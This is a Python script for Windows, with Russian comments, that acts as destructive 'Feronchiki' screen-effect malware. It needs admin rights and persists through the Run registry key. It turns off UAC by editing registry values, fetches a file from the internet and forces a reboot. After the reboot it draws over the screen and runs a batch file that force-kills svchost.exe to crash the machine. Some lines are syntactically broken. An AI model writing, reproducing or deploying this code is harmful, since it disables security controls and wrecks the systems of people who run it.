import os
import random
import time
import ctypes
import urllib.request
import subprocess
import winreg
from ctypes import wintypes

# Константы для Windows API
HWND_TOPMOST = -1
SWP_NOMOVE = 2
SWP_NOSIZE = 1

def disable_uac():
    """Отключает UAC через реестр"""
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_to_startup():
    """Добавляет программу в автозапуск"""
    try:
        exe_path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Feronchiki", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

def create_killer_bat():
    """Создаёт bat-файл для убийства системы"""
    os.makedirs("C:\\Windows\\cmd", exist_ok=True)
    with open("C:\\Windows\\cmd\\Киллер.bat", "w") as f:
        f.write("@echo off\n")
        f.write("taskkill /im svchost.exe /f\n")
    return "C:\\Windows\\cmd\\Киллер.bat"

def download_video():
    """Скачивает видео из интернета"""
    try:
        url = "https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win/1039525/chrome-win.zip"
        urllib.request.urlretrieve(url, "C:\\Windows\\cmd\\video.mp4")
        return True
    except:
        # Фейковое видео если не скачалось
        with open("C:\\Windows\\cmd\\video.mp4", "wb") as f:
            f.write(b"fake mp4 content")
        return False

def play_video():
    """Запускает видео через ассоциированный проигрыватель"""
    os.startfile("C:\\Windows\\cmd\\video.mp4")

def gdi_effects():
    """GDI эффекты с текстом Feronchiki"""
    # Получаем дескриптор экрана
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    
    # Получаем DC всего экрана
    hdc = user32.GetDC(0)
    
    # Чёрная кисть для заливки
    black_brush = gdi32.CreateSolidBrush(0x000000)
    
    # Создаём шрифт
    hfont = gdi32.CreateFontA(48, 0, 0, 0, 700, False, False, False,
                              0, 0, 0, 0, 0, b"Arial")
    old_font = gdi32.SelectObject(hdc, hfont)
    
    # Рисуем 150 случайных текстов
    for i in range(150):
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        r = random.randint(0, 255)
        g = random.randint(0, 255)
        b = random.randint(0, 255)
        color = (b << 16) | (g << 8) | r
        
        gdi32.SetTextColor(hdc, color)
        gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
        
        size = random.randint(24, 76)
        temp_font = gdi32.CreateFontA(size, 0, 0, 0, 700, False, False, False,
                                      0, 0, 0, 0, 0, b"Arial")
        gdi32.SelectObject(hdc, temp_font)
        
        gdi32.TextOutA(hdc, x, y, b"Feronchiki", 10)
        
        gdi32.SelectObject(hdc, hfont)
        gdi32.DeleteObject(temp_font)
    
    time.sleep(2)
    
    # Анимированная надпись FERONCHIKI
    rect = ctypes.create_string_buffer(16)
    for i in range(0, screen_height, 40):
        gdi32.FillRect(hdc, ctypes.byref(rect), black_brush)
        gdi32.SetTextColor(hdc, 0x0000FF)  # Красный
        gdi32.TextOutA(hdc, screen_width//2 - 100, i, b"FERONCHIKI", 10)
        time.sleep(0.02)
    
    time.sleep(1)
    
    # Очистка
    gdi32.SelectObject(hdc, old_font)
    gdi32.DeleteObject(hfont)
    gdi32.DeleteObject(black_brush)
    user32.ReleaseDC(0, hdc)

def disable_uac_animation():
    """Анимация отключения UAC на весь экран"""
user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    
    hdc = user32.GetDC(0)
    black_brush = gdi32.CreateSolidBrush(0x000000)
    
    for frame in range(30):
        rect = ctypes.create_string_buffer(16)
        gdi32.FillRect(hdc, ctypes.byref(rect), black_brush)
        gdi32.SetTextColor(hdc, 0x00FF00)  # Зелёный
        gdi32.SetBkMode(hdc, 1)  # TRANSPARENT
        
        text = f"DISABLING UAC... {(frame + 1) * 3}%"
        gdi32.TextOutA(hdc, screen_width//2 - 100, screen_height//2, 
                       text.encode('ascii'), len(text))
        time.sleep(0.05)
    
    disable_uac()
    
    # Очистка экрана и финальное сообщение
    gdi32.FillRect(hdc, ctypes.byref(rect), black_brush)
    gdi32.SetTextColor(hdc, 0x00FF00)
    gdi32.TextOutA(hdc, screen_width//2 - 80, screen_height//2, 
                   b"UAC DISABLED", 12)
    time.sleep(1)
    
    gdi32.DeleteObject(black_brush)
    user32.ReleaseDC(0, hdc)

def reboot_system():
    """Перезагружает систему"""
    # Получаем привилегию на перезагрузку
    ctypes.windll.advapi32.AdjustTokenPrivileges(
        ctypes.windll.kernel32.GetCurrentProcess(),
        False, None, 0, None, None
    )
    ctypes.windll.user32.ExitWindowsEx(2, 0)  # EWX_REBOOT

def kill_system():
    """Запускает киллер.bat"""
    subprocess.run("C:\\Windows\\cmd\\Киллер.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def main():
    # Проверка прав администратора
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        print("Ошибка: запустите программу от имени администратора")
        input("Нажмите Enter для выхода...")
        return
    
    # Проверка, был ли уже перезапуск
    marker_file = "C:\\Windows\\cmd\\reboot_marker.txt"
    is_post_reboot = os.path.exists(marker_file)
    
    if not is_post_reboot:
        # ===== ПЕРВЫЙ ЗАПУСК (ДО ПЕРЕЗАГРУЗКИ) =====
        
        add_to_startup()
        create_killer_bat()
        download_video()
        
        # Запускаем видео
        play_video()
        
        time.sleep(5)
        
        # Анимация отключения UAC
        disable_uac_animation()
        
        # Создаём маркерный файл
        os.makedirs("C:\\Windows\\cmd", exist_ok=True)
        with open(marker_file, "w") as f:
            f.write("rebooted")
        
        # Перезагружаем систему
        reboot_system()
        
    else:
        # ===== ВТОРОЙ ЗАПУСК (ПОСЛЕ ПЕРЕЗАГРУЗКИ) =====
        
        # Удаляем маркерный файл
        os.remove(marker_file)
        
        # GDI эффекты
        gdi_effects()
        
        time.sleep(5)
        
        # Убиваем систему
        kill_system()

if __name__ == "__main__":
    import sys
    main()